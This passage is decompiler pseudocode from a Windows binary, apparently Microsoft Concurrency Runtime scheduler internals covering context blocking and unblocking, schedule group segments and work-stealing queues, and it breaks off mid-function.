
//----- (000000013F15701C) ----------------------------------------------------
void __fastcall sub_13F15701C(__int64 a1, __int64 a2)
{
  sub_13F14EC9C(a1 + 16, a2);
  sub_13F1571C4(a1, 0i64, 0);
  *(_DWORD *)(a1 + 144) = 0;
  *(_BYTE *)(a1 + 368) = 1;
}

//----- (000000013F157050) ----------------------------------------------------
void __fastcall sub_13F157050(__int64 a1, __int64 a2)
{
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  if ( !a2 )
  {
    sub_13F1097A8(pExceptionObject, (__int64)"pThreadProxy");
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  *(_QWORD *)(a1 + 256) = a2;
}
// 13F157050: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F157088) ----------------------------------------------------
__int64 __fastcall sub_13F157088(__int64 a1)
{
  __int64 result; // rax
  char v3[8]; // [rsp+20h] [rbp-28h] BYREF
  int v4; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall *v5)(); // [rsp+30h] [rbp-18h]

  result = *(unsigned int *)(a1 + 96);
  if ( !(_DWORD)result )
  {
    v4 = 0;
    v5 = sub_13F142C2C;
    do
    {
      sub_13F141BF4((__int64)v3);
      result = *(unsigned int *)(a1 + 96);
    }
    while ( !(_DWORD)result );
  }
  return result;
}
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F157088: using guessed type char var_28[8];

//----- (000000013F1570C0) ----------------------------------------------------
__int64 __fastcall sub_13F1570C0(__int64 a1)
{
  char v2; // di
  __int64 v3; // rcx
  __int64 result; // rax
  int v5[4]; // [rsp+30h] [rbp-28h] BYREF
  __int64 v6; // [rsp+40h] [rbp-18h]

  v2 = 0;
  sub_13F1024C0();
  (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 56) + 8i64))(*(_QWORD *)(a1 + 56));
  if ( *(_BYTE *)(*(_QWORD *)(a1 + 248) + 257i64) )
  {
    sub_13F157284(a1 - 16, 2);
  }
  else
  {
    v3 = *(_QWORD *)(a1 + 248);
    v5[0] = 0;
    v6 = 0i64;
    if ( (*(unsigned __int8 (__fastcall **)(__int64, int *, _QWORD, _QWORD, int))(v3 + 104))(
           v3 + 64,
           v5,
           *(_QWORD *)(a1 + 48),
           0i64,
           1) )
    {
      sub_13F157404(a1 - 16, v6, 2);
    }
    else
    {
      v2 = 1;
    }
  }
  result = sub_13F1024C0();
  if ( v2 )
    return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 240) + 24i64))(*(_QWORD *)(a1 + 240));
  return result;
}
// 13F15710D: conditional instruction was optimized away because cl.1==0
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5EB8: using guessed type int dword_13F1C5EB8;
// 13F1C5EBC: using guessed type char byte_13F1C5EBC;
// 13F1570C0: using guessed type int var_28[4];

//----- (000000013F1571C4) ----------------------------------------------------
void __fastcall sub_13F1571C4(__int64 a1, __int64 a2, char a3)
{
  signed __int64 v6; // rdi
  __int64 v7; // rax
  char v8[8]; // [rsp+20h] [rbp-28h] BYREF
  int v9; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall *v10)(); // [rsp+30h] [rbp-18h]

  if ( *(_QWORD *)(a1 + 64) )
  {
    if ( *(_DWORD *)(a1 + 352) )
    {
      v9 = 0;
      v10 = sub_13F142C2C;
      do
        sub_13F141BF4((__int64)v8);
      while ( *(_DWORD *)(a1 + 352) );
    }
    v6 = *(_QWORD *)(*(_QWORD *)(a1 + 64) + 424i64);
    if ( (*(_BYTE *)(v6 + 80) & 4) == 0
      && _InterlockedExchangeAdd((volatile signed __int32 *)(v6 + 40), 0xFFFFFFFF) == 1 )
    {
      (*(void (__fastcall **)(signed __int64))(*(_QWORD *)v6 + 56i64))(v6);
      sub_13F14B92C(*(_QWORD *)(v6 + 8), v6);
    }
    if ( a3 )
    {
      v7 = *(_QWORD *)(a2 + 424);
      if ( (*(_BYTE *)(v7 + 80) & 4) == 0 )
        _InterlockedIncrement((volatile signed __int32 *)(v7 + 40));
    }
    *(_QWORD *)(a1 + 64) = a2;
  }
}
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1571C4: using guessed type char var_28[8];

//----- (000000013F157284) ----------------------------------------------------
char __fastcall sub_13F157284(__int64 a1, int a2)
{
  __int64 v2; // r14
  char v3; // si
  __int64 v6; // rcx
  int v8[2]; // [rsp+20h] [rbp-38h] BYREF
  __int64 v9; // [rsp+28h] [rbp-30h]
  __int64 v10; // [rsp+30h] [rbp-28h]
  int v11; // [rsp+68h] [rbp+10h] BYREF

  v2 = *(_QWORD *)(a1 + 256);
  v3 = 0;
  if ( *(_QWORD *)(a1 + 264) )
  {
    sub_13F156F7C(a1);
    v11 = *(_DWORD *)(*(_QWORD *)(a1 + 264) + 304i64);
    sub_13F1024C0();
    (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 264) + 24i64))(*(_QWORD *)(a1 + 264));
    *(_QWORD *)(a1 + 264) = 0i64;
    if ( a2 )
    {
      sub_13F1024C0();
      _InterlockedExchange((volatile __int32 *)(a1 + 96), 1);
    }
    else
    {
      (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 72) + 8i64))(*(_QWORD *)(a1 + 72));
      sub_13F159414(*(_QWORD *)(a1 + 64), a1);
    }
    sub_13F14C45C(*(_QWORD *)(a1 + 72), &v11);
    sub_13F14C594(*(volatile signed __int32 **)(a1 + 72), 0i64);
    v3 = *(_BYTE *)(a1 + 292);
    if ( !a2 )
      _InterlockedExchange((volatile __int32 *)(a1 + 96), 1);
  }
  if ( (unsigned int)(a2 - 2) <= 1 )
  {
    v6 = *(_QWORD *)(a1 + 64);
    v8[0] ^= (v8[0] ^ *(_DWORD *)(v6 + 24)) & 0xFFFFFFF;
    v8[0] = *(_DWORD *)(v6 + 24) ^ (*(_DWORD *)(v6 + 24) ^ v8[0]) & 0xFFFFFFF;
    v9 = *(_QWORD *)(v6 + 32);
    v8[1] = *(_DWORD *)(v6 + 28);
    v10 = *(_QWORD *)(v6 + 40);
    sub_13F158884((_QWORD *)v6, a1, (__int64)v8);
  }
  if ( a2 )
    (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)v2 + 16i64))(v2, 1i64);
  return v3;
}
// 13F15733C: conditional instruction was optimized away because cl.1==0
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F157404) ----------------------------------------------------
__int64 __fastcall sub_13F157404(__int64 a1, __int64 a2, int a3)
{
  unsigned int v6; // edi
  __int64 v7; // rcx
  __int64 v8; // r14
  __int64 v9; // rbp
  __int64 v10; // rax
  __int64 v11; // r15
  __int64 result; // rax
  int v13[2]; // [rsp+20h] [rbp-48h] BYREF
  __int64 v14; // [rsp+28h] [rbp-40h]
  __int64 v15; // [rsp+30h] [rbp-38h]
  __int64 v16; // [rsp+70h] [rbp+8h]

  v6 = 1;
  if ( a3 )
  {
    if ( a3 != 1 )
    {
      if ( a3 == 2 )
      {
        v7 = *(_QWORD *)(a1 + 64);
        v13[0] ^= (v13[0] ^ *(_DWORD *)(v7 + 24)) & 0xFFFFFFF;
        v13[0] = *(_DWORD *)(v7 + 24) ^ (v13[0] ^ *(_DWORD *)(v7 + 24)) & 0xFFFFFFF;
        v14 = *(_QWORD *)(v7 + 32);
        v13[1] = *(_DWORD *)(v7 + 28);
        v15 = *(_QWORD *)(v7 + 40);
        sub_13F158884((_QWORD *)v7, a1, (__int64)v13);
      }
      else if ( a3 == 3 )
      {
        v6 = 2;
      }
    }
  }
  else
  {
    (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 72) + 8i64))(*(_QWORD *)(a1 + 72));
    sub_13F159414(*(_QWORD *)(a1 + 64), a1);
    v6 = 0;
  }
  sub_13F1024C0();
  v8 = *(_QWORD *)(a1 + 264);
  v9 = a2;
  v10 = *(_QWORD *)(a1 + 72);
  *(_QWORD *)(a1 + 264) = 0i64;
  v11 = *(_QWORD *)(a1 + 256);
  v16 = v10;
  if ( !a2 )
    v9 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v8 + 8i64))(v8);
  _InterlockedExchange((volatile __int32 *)(a1 + 96), 1);
  (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)v8 + 32i64))(v8, a2);
  if ( v9 )
  {
    result = (*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)v11 + 8i64))(v11, v9, v6);
  }
  else
  {
    sub_13F154B48(v8, 4, 1);
    sub_13F149168(v16);
    result = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v11 + 16i64))(v11, v6);
  }
  if ( a3 )
    return sub_13F1024C0();
  return result;
}
// 13F1574DE: conditional instruction was optimized away because cl.1==0
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5EB8: using guessed type int dword_13F1C5EB8;
// 13F1C5EBC: using guessed type char byte_13F1C5EBC;

//----- (000000013F1575D4) ----------------------------------------------------
__int64 __fastcall sub_13F1575D4(__int64 a1)
{
  __int64 v2; // rsi
  signed __int32 v3; // edi
  __int64 v4; // r8
  __int64 result; // rax
  int v6[2]; // [rsp+20h] [rbp-50h] BYREF
  __int64 v7; // [rsp+28h] [rbp-48h]
  __int64 v8; // [rsp+30h] [rbp-40h]
  __int64 v9[3]; // [rsp+38h] [rbp-38h] BYREF
  __int64 pExceptionObject[4]; // [rsp+50h] [rbp-20h] BYREF

  v2 = a1 - 16;
  if ( (a1 & -(__int64)(a1 != 16)) == sub_13F1492D4() )
  {
    sub_13F142C9C(pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVcontext_self_unblock_Concurrency__);
  }
  v3 = _InterlockedDecrement((volatile signed __int32 *)(a1 + 84));
  (*(void (__fastcall **)(_QWORD, __int64))(**(_QWORD **)(a1 + 56) + 8i64))(*(_QWORD *)(a1 + 56), -v2);
  if ( v3 == 1 )
  {
    *(_DWORD *)(a1 + 84) = 0;
    sub_13F157088(v2);
    v4 = *(_QWORD *)(a1 + 48);
    v6[0] ^= (v6[0] ^ *(_DWORD *)(v4 + 24)) & 0xFFFFFFF;
    v6[0] = *(_DWORD *)(v4 + 24) ^ (*(_DWORD *)(v4 + 24) ^ v6[0]) & 0xFFFFFFF;
    v7 = *(_QWORD *)(v4 + 32);
    v6[1] = *(_DWORD *)(v4 + 28);
    v8 = *(_QWORD *)(v4 + 40);
    return (*(__int64 (__fastcall **)(__int64, int *))(*(_QWORD *)v2 + 40i64))(v2, v6);
  }
  else
  {
    result = (unsigned int)(v3 + 1);
    if ( (unsigned int)result > 1 )
    {
      sub_13F142CB4(v9);
      CxxThrowException(v9, (_ThrowInfo *)&_TI2_AVcontext_unblock_unbalanced_Concurrency__);
    }
  }
  return result;
}
// 13F157647: conditional instruction was optimized away because cl.1==0
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5EB8: using guessed type int dword_13F1C5EB8;
// 13F1C5EBC: using guessed type char byte_13F1C5EBC;
// 13F1575D4: using guessed type _QWORD pExceptionObject[4];
// 13F1575D4: using guessed type _QWORD var_38[3];

//----- (000000013F157714) ----------------------------------------------------
__int64 __fastcall sub_13F157714(__int64 a1)
{
  __int64 v2; // rsi
  unsigned int v3; // ebx
  __int64 v4; // rbx
  unsigned int v5; // eax
  __int64 v6; // rcx
  __int64 result; // rax

  if ( ++*(_DWORD *)(a1 + 288) == 1 )
  {
    v2 = *(_QWORD *)(a1 + 72);
    v3 = *(_DWORD *)(*(_QWORD *)(a1 + 264) + 212i64);
    sub_13F154AAC(v2 + 96, v3);
    v4 = 16 * v3;
    if ( *(_QWORD *)(*(_QWORD *)(v2 + 160) + 8 * v4) == 1i64 )
      _InterlockedCompareExchange64((volatile signed __int64 *)(*(_QWORD *)(v2 + 160) + 8 * v4), 0i64, 1i64);
  }
  v5 = *(_DWORD *)(a1 + 288);
  if ( v5 < 0x100 )
    return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 256) + 24i64))(*(_QWORD *)(a1 + 256));
  if ( v5 == 256 )
  {
    v6 = *(_QWORD *)(a1 + 264);
    *(_BYTE *)(a1 + 294) = 1;
    sub_13F154B48(v6, 2, 1);
    return sub_13F15467C(*(_QWORD *)(a1 + 264));
  }
  if ( (*(_BYTE *)(a1 + 295) & 2) != 0 )
  {
    *(_DWORD *)(a1 + 288) = v5 - 1;
    return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 256) + 24i64))(*(_QWORD *)(a1 + 256));
  }
  sub_13F14C680(*(_QWORD *)(a1 + 72), 1);
  while ( !(unsigned __int8)sub_13F154664(*(_QWORD *)(a1 + 264)) )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)a1 + 64i64))(a1);
  result = sub_13F14C680(*(_QWORD *)(a1 + 72), 0);
  *(_BYTE *)(a1 + 294) = 0;
  if ( *(_DWORD *)(a1 + 288) )
    result = sub_13F154A10(*(_QWORD *)(a1 + 72) + 96i64, *(_DWORD *)(*(_QWORD *)(a1 + 264) + 212i64));
  *(_DWORD *)(a1 + 288) = 0;
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F157868) ----------------------------------------------------
char __fastcall sub_13F157868(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  LOBYTE(a4) = *(_BYTE *)(a1 + 294);
  if ( !(*(unsigned __int8 (__fastcall **)(__int64, __int64, _QWORD, __int64, int))(*(_QWORD *)(a1 + 264) + 104i64))(
          *(_QWORD *)(a1 + 264) + 64i64,
          a2,
          *(_QWORD *)(a1 + 64),
          a4,
          7) )
    return 0;
  sub_13F156F7C(a1);
  if ( *(_DWORD *)(a1 + 288) )
    sub_13F154A10(*(_QWORD *)(a1 + 72) + 96i64, *(_DWORD *)(*(_QWORD *)(a1 + 264) + 212i64));
  *(_DWORD *)(a1 + 288) = 0;
  return 1;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1578DC) ----------------------------------------------------
__int64 __fastcall sub_13F1578DC(__int64 a1)
{
  char v2; // si
  __int64 v3; // rcx
  __int64 v4; // rdi
  __int64 v5; // rdx
  char v6; // al
  __int64 result; // rax
  int v8[4]; // [rsp+30h] [rbp-20h] BYREF
  __int64 v9; // [rsp+40h] [rbp-10h]

  v2 = 0;
  sub_13F1024C0();
  (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 56) + 8i64))(*(_QWORD *)(a1 + 56));
  if ( *(_BYTE *)(*(_QWORD *)(a1 + 248) + 257i64) )
  {
    sub_13F157284(a1 - 16, 2);
    goto LABEL_19;
  }
  v3 = *(_QWORD *)(a1 + 248);
  v8[0] = 0;
  v9 = 0i64;
  if ( !(*(unsigned __int8 (__fastcall **)(__int64, int *, _QWORD, _QWORD, int))(v3 + 112))(
          v3 + 64,
          v8,
          *(_QWORD *)(a1 + 48),
          0i64,
          9) )
    goto LABEL_18;
  if ( v8[0] == 1 )
  {
LABEL_12:
    v4 = v9;
    goto LABEL_13;
  }
  sub_13F1024C0();
  v4 = sub_13F149D3C(*(_QWORD *)(a1 + 56), 1);
  sub_13F1024C0();
  if ( v4 )
  {
    if ( sub_13F15C81C((__int64)v8) )
    {
      v5 = v4;
LABEL_8:
      sub_13F15C078((__int64)v8, v5);
      goto LABEL_13;
    }
    v6 = (*(__int64 (__fastcall **)(__int64, int *, _QWORD, _QWORD, int))(*(_QWORD *)(a1 + 248) + 112i64))(
           *(_QWORD *)(a1 + 248) + 64i64,
           v8,
           *(_QWORD *)(a1 + 48),
           0i64,
           3);
    v5 = v4;
    if ( v6 )
    {
      if ( v8[0] != 1 )
        goto LABEL_8;
      sub_13F14B404(*(_QWORD *)(a1 + 56), v4, 1);
      goto LABEL_12;
    }
    sub_13F14B404(*(_QWORD *)(a1 + 56), v4, 1);
    v4 = 0i64;
  }
  else
  {
    if ( !(*(unsigned __int8 (__fastcall **)(__int64, int *, _QWORD, _QWORD, int))(*(_QWORD *)(a1 + 248) + 112i64))(
            *(_QWORD *)(a1 + 248) + 64i64,
            v8,
            *(_QWORD *)(a1 + 48),
            0i64,
            1) )
      goto LABEL_18;
    v4 = sub_13F15C01C((__int64)v8);
  }
LABEL_13:
  if ( v4 )
  {
    sub_13F157404(a1 - 16, v4, 2);
    goto LABEL_19;
  }
LABEL_18:
  v2 = 1;
LABEL_19:
  result = sub_13F1024C0();
  if ( v2 )
    return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 240) + 24i64))(*(_QWORD *)(a1 + 240));
  return result;
}
// 13F157931: conditional instruction was optimized away because cl.1==0
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5EB8: using guessed type int dword_13F1C5EB8;
// 13F1C5EBC: using guessed type char byte_13F1C5EBC;

//----- (000000013F157ACC) ----------------------------------------------------
__int64 __fastcall sub_13F157ACC(__int64 a1, __int64 a2, int a3)
{
  int v7[2]; // [rsp+28h] [rbp-20h] BYREF
  __int128 v8; // [rsp+30h] [rbp-18h]

  *(_QWORD *)a1 = a2;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F147A00(a1 + 32, a2, 256, 64);
  sub_13F147A00(a1 + 160, a2, 256, 64);
  *(_DWORD *)(a1 + 288) = 0;
  *(_DWORD *)(a1 + 292) = 0;
  *(_DWORD *)(a1 + 296) = a3;
  *(_DWORD *)(a1 + 300) = 0;
  v7[0] = 0;
  v7[1] = 0;
  v8 = 0i64;
  *(_QWORD *)(a1 + 16) = sub_13F158A14(*(_QWORD *)(a2 + 304), v7, a1);
  return a1;
}

//----- (000000013F157B8C) ----------------------------------------------------
__int64 __fastcall sub_13F157B8C(__int64 a1)
{
  _QWORD *v2; // rbx
  void (__fastcall ***v3)(_QWORD, __int64); // rcx
  __int64 v4; // rdx
  _QWORD *v5; // rbx
  void (__fastcall ***v6)(_QWORD, __int64); // rcx
  _QWORD *v7; // rbx
  void (__fastcall ***v8)(_QWORD, __int64); // rcx
  _QWORD *v9; // rsi
  int v10; // ebx
  __int64 v11; // r14
  void (__fastcall ***v12)(_QWORD, __int64); // rcx
  _QWORD *v13; // rbx

  v2 = (_QWORD *)MEMORY[0x771B51E0]();
  while ( v2 )
  {
    v3 = (void (__fastcall ***)(_QWORD, __int64))(v2 - 60);
    v2 = (_QWORD *)*v2;
    if ( v3 )
      (**v3)(v3, 1i64);
  }
  v5 = (_QWORD *)MEMORY[0x771B51E0](a1 + 16);
  while ( v5 )
  {
    v6 = (void (__fastcall ***)(_QWORD, __int64))(v5 - 60);
    v5 = (_QWORD *)*v5;
    if ( v6 )
      (**v6)(v6, 1i64);
  }
  v7 = *(_QWORD **)(a1 + 32);
  while ( v7 )
  {
    v8 = (void (__fastcall ***)(_QWORD, __int64))(v7 - 60);
    v7 = (_QWORD *)*v7;
    if ( v8 )
      (**v8)(v8, 1i64);
  }
  v9 = *(_QWORD **)(a1 + 88);
  if ( v9 )
  {
    do
    {
      v10 = 0;
      if ( *(int *)(a1 + 80) > 0 )
      {
        v11 = 0i64;
        do
        {
          v12 = *(void (__fastcall ****)(_QWORD, __int64))(v11 + *v9);
          if ( v12 )
            (**v12)(v12, 1i64);
          ++v10;
          v11 += 8i64;
        }
        while ( v10 < *(_DWORD *)(a1 + 80) );
      }
      v13 = (_QWORD *)v9[1];
      sub_13F14088C(*v9, v4);
      sub_13F14088C(v9, 24i64);
      v9 = v13;
    }
    while ( v13 );
  }
  return sub_13F14088C(*(_QWORD *)(a1 + 96), v4);
}
// 13F157C7B: variable 'v4' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F157CB4) ----------------------------------------------------
__int64 __fastcall sub_13F157CB4(__int64 a1)
{
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F157B8C(a1 + 160);
  return sub_13F157B8C(a1 + 32);
}

//----- (000000013F157CDC) ----------------------------------------------------
__int64 __fastcall sub_13F157CDC(__int64 a1)
{
  return (unsigned int)_InterlockedExchange((volatile __int32 *)(a1 + 300), 1);
}

//----- (000000013F157CE8) ----------------------------------------------------
char __fastcall sub_13F157CE8(__int64 a1)
{
  char result; // al
  _QWORD *v3; // rdi
  __int64 (__fastcall ***v4)(_QWORD, __int64); // rcx

  result = sub_13F14A2E4(*(_QWORD *)(a1 + 72));
  if ( !result )
  {
    v3 = *(_QWORD **)(a1 + 32);
    while ( v3 )
    {
      v4 = (__int64 (__fastcall ***)(_QWORD, __int64))(v3 - 60);
      v3 = (_QWORD *)*v3;
      if ( v4 )
        result = (**v4)(v4, 1i64);
    }
    *(_QWORD *)(a1 + 32) = 0i64;
    _InterlockedExchange((volatile __int32 *)(a1 + 120), 0);
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F157D54) ----------------------------------------------------
char __fastcall sub_13F157D54(__int64 a1, signed __int64 a2, int a3, char a4)
{
  int v5; // er10
  int v7; // er11
  __int64 v8; // r8
  int v9; // er10
  __int64 v10; // r8
  __int64 v11; // rcx
  unsigned __int16 v12; // ax
  signed __int64 v13; // rdx
  __int64 v14; // rax
  __int64 v15; // r9

  v5 = a3 >> *(_DWORD *)(a1 + 84);
  v7 = a3 & (*(_DWORD *)(a1 + 80) - 1);
  if ( v5 >= *(_DWORD *)(a1 + 108) )
    return 0;
  v8 = *(_QWORD *)(a1 + 96);
  if ( v5 < *(_DWORD *)(a1 + 104) )
  {
    v10 = *(_QWORD *)(v8 + 8i64 * v5);
  }
  else
  {
    v9 = v5 - *(_DWORD *)(a1 + 104);
    v10 = *(_QWORD *)(v8 + 8i64 * *(int *)(a1 + 104) - 8);
    if ( v9 >= 0 )
    {
      v11 = (unsigned int)(v9 + 1);
      do
      {
        v10 = *(_QWORD *)(v10 + 8);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( _InterlockedCompareExchange64((volatile signed __int64 *)(*(_QWORD *)v10 + 8i64 * v7), 0i64, a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 16), v7, -2);
  if ( a4 )
  {
    v12 = MEMORY[0x771A31E0](a1);
    v13 = a2 + 480;
    if ( v12 <= *(int *)(a1 + 116) )
    {
      MEMORY[0x771C4CC0](a1, v13);
    }
    else
    {
      MEMORY[0x771C4CC0](a1 + 16, v13);
      if ( (unsigned __int16)MEMORY[0x771A31E0](a1 + 16) > *(int *)(a1 + 116)
        && !sub_13F14A2E4(*(_QWORD *)(a1 + 72))
        && !_InterlockedCompareExchange((volatile signed __int32 *)(a1 + 120), 1, 0) )
      {
        v14 = MEMORY[0x771B51E0](a1 + 16);
        v15 = *(_QWORD *)(a1 + 72);
        *(_QWORD *)(a1 + 32) = v14;
        sub_13F14AA74(
          (__int64 (__fastcall **)(__int64))(a1 + 40),
          (__int64 (__fastcall *)(__int64))sub_13F157D4C,
          (__int64 (__fastcall *)(__int64))a1,
          v15);
      }
    }
  }
  return 1;
}

//----- (000000013F157E94) ----------------------------------------------------
char __fastcall sub_13F157E94(__int64 a1, signed __int64 a2)
{
  return sub_13F157D54(
           a1 + 160 + (-(__int64)((*(_DWORD *)(a2 + 24) & 0xFFFFFFF) != 0) & 0xFFFFFFFFFFFFFF80ui64),
           a2,
           *(_DWORD *)(a2 + 416),
           1);
}

//----- (000000013F157EC4) ----------------------------------------------------
__int64 __fastcall sub_13F157EC4(__int64 a1, __int64 a2, __int64 a3, char a4, unsigned int a5)
{
  int *v7; // rsi
  __int64 v8; // rdi
  __int64 v9; // rax

  *(_QWORD *)a1 = a2;
  v7 = (int *)(a1 + 8);
  v8 = 0i64;
  *(_DWORD *)(a1 + 8) = 0;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_DWORD *)(a1 + 24) = a5;
  *(_QWORD *)(a1 + 32) = 0i64;
  *(_QWORD *)(a1 + 40) = 0i64;
  *(_DWORD *)(a1 + 48) = 0;
  *(_DWORD *)(a1 + 52) = 0;
  *(_DWORD *)(a1 + 56) = 0;
  sub_13F149020((int *)(a1 + 8), (int *)(a1 + 8));
  if ( *(_QWORD *)(a1 + 40) )
    sub_13F149020((int *)(*(_QWORD *)(a1 + 40) + 8i64), v7);
  if ( !a4 )
  {
    v9 = sub_13F14059C(80i64);
    if ( v9 )
      v8 = sub_13F158124(v9, *(_QWORD *)a1, v7, a5, 0);
    *(_QWORD *)(a1 + 32) = v8;
    *(_QWORD *)(a1 + 40) = v8;
  }
  return a1;
}

//----- (000000013F157F88) ----------------------------------------------------
__int64 __fastcall sub_13F157F88(__int64 a1, __int64 a2, __int64 a3)
{
  *(_QWORD *)a1 = off_13F18BE88;
  *(_QWORD *)(a1 + 8) = a2;
  *(_DWORD *)(a1 + 16) = 0;
  *(_QWORD *)(a1 + 24) = 0i64;
  *(_QWORD *)(a1 + 32) = 0i64;
  *(_DWORD *)(a1 + 40) = 0;
  *(_QWORD *)(a1 + 56) = 0i64;
  *(_QWORD *)(a1 + 64) = 0i64;
  *(_QWORD *)(a1 + 72) = 0i64;
  *(_DWORD *)(a1 + 40) = 1;
  *(_DWORD *)(a1 + 56) ^= (*(_DWORD *)(a1 + 56) ^ *(_DWORD *)a3) & 0xFFFFFFF;
  *(_DWORD *)(a1 + 56) = *(_DWORD *)a3 ^ (*(_DWORD *)(a1 + 56) ^ *(_DWORD *)a3) & 0xFFFFFFF;
  *(_QWORD *)(a1 + 64) = *(_QWORD *)(a3 + 8);
  *(_DWORD *)(a1 + 60) = *(_DWORD *)(a3 + 4);
  *(_QWORD *)(a1 + 72) = *(_QWORD *)(a3 + 16);
  *(_DWORD *)(a1 + 48) = sub_13F149E88(*(_QWORD *)(a1 + 8));
  return a1;
}
// 13F18BE88: using guessed type __int64 (__fastcall *off_13F18BE88[10])();

//----- (000000013F15801C) ----------------------------------------------------
__int64 __fastcall sub_13F15801C(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v8; // rax
  __int64 v9; // rdx
  _QWORD v11[3]; // [rsp+38h] [rbp-30h] BYREF

  *(_QWORD *)a1 = &Concurrency::details::ScheduleGroupSegmentBase::`vftable';
  *(_DWORD *)(a1 + 24) = 0;
  *(_DWORD *)(a1 + 28) = 0;
  *(_QWORD *)(a1 + 32) = 0i64;
  *(_QWORD *)(a1 + 40) = 0i64;
  *(_DWORD *)(a1 + 48) = 0;
  *(_QWORD *)(a1 + 56) = 0i64;
  *(_QWORD *)(a1 + 72) = 0i64;
  *(_QWORD *)(a1 + 80) = a1 + 72;
  *(_DWORD *)(a1 + 88) = 0;
  v8 = sub_13F149ADC(*(_QWORD *)(a2 + 8), (__int64)v11, (_DWORD *)(a1 + 24));
  sub_13F157EC4(a1 + 96, *(_QWORD *)(a2 + 8), v8, 0, 0x40u);
  sub_13F14088C(v11[1], v9);
  sub_13F147A00(a1 + 160, *(_QWORD *)(a2 + 8), 256, 64);
  sub_13F147A00(a1 + 288, *(_QWORD *)(a2 + 8), 256, 0x7FFFFFFF);
  *(_QWORD *)(a1 + 440) = 0i64;
  sub_13F158FC0(a1, a2, a3, a4);
  return a1;
}
// 13F1580B3: variable 'v9' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18BE60: using guessed type void *Concurrency::details::ScheduleGroupSegmentBase::`vftable';

//----- (000000013F158124) ----------------------------------------------------
__int64 __fastcall sub_13F158124(__int64 a1, __int64 a2, int *a3, unsigned int a4, int a5)
{
  unsigned __int64 v5; // rbx
  __int64 v7; // rcx
  unsigned __int128 v8; // rax
  __int64 v9; // rax

  v5 = a4;
  *(_QWORD *)a1 = a2;
  v7 = a1 + 8;
  *(_DWORD *)v7 = 0;
  *(_QWORD *)(v7 + 8) = 0i64;
  sub_13F149020((int *)v7, a3);
  *(_DWORD *)(a1 + 32) = a5;
  *(_DWORD *)(a1 + 36) = 0;
  *(_QWORD *)(a1 + 40) = 0i64;
  v8 = v5 * (unsigned __int128)8ui64;
  if ( !is_mul_ok(v5, 8ui64) )
    *(_QWORD *)&v8 = -1i64;
  v9 = sub_13F1790C4(v8, *((_QWORD *)&v8 + 1));
  *(_QWORD *)(a1 + 24) = v9;
  sub_13F15EF70(v9, 0, 8i64 * (unsigned int)v5);
  return a1;
}
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);

//----- (000000013F1581AC) ----------------------------------------------------
__int64 __fastcall sub_13F1581AC(__int64 a1)
{
  _QWORD *v2; // rbx
  _QWORD *v3; // rcx
  __int64 v4; // rdx
  _QWORD *v5; // rbx
  _QWORD *v6; // rcx
  _QWORD *v7; // rbx
  _QWORD *v8; // rcx
  _QWORD *v9; // rsi
  int v10; // ebx
  __int64 v11; // rbp
  _QWORD *v12; // rbx

  v2 = (_QWORD *)MEMORY[0x771B51E0]();
  while ( v2 )
  {
    v3 = v2 - 2;
    v2 = (_QWORD *)*v2;
    sub_13F14088C(v3, 48i64);
  }
  v5 = (_QWORD *)MEMORY[0x771B51E0](a1 + 16);
  while ( v5 )
  {
    v6 = v5 - 2;
    v5 = (_QWORD *)*v5;
    sub_13F14088C(v6, 48i64);
  }
